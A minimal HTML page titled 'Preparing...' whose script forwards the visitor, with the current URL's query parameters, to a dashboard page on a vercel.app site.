<!DOCTYPE html>
<html>
<head>
  <title>Preparing...</title>
  <script>
    // Get current URL parameters
    const params = new URLSearchParams(window.location.search);

    // Base URL you want to redirect to
    const baseURL = "https://sharing-is-informing.vercel.app/dashboard.html";

    // Append current parameters to the base URL
    const redirectURL = baseURL + "?" + params.toString();

    // Redirect
    window.location.href = redirectURL;
  </script>
</head>
<body>
  Preparing...
</body>
</html>
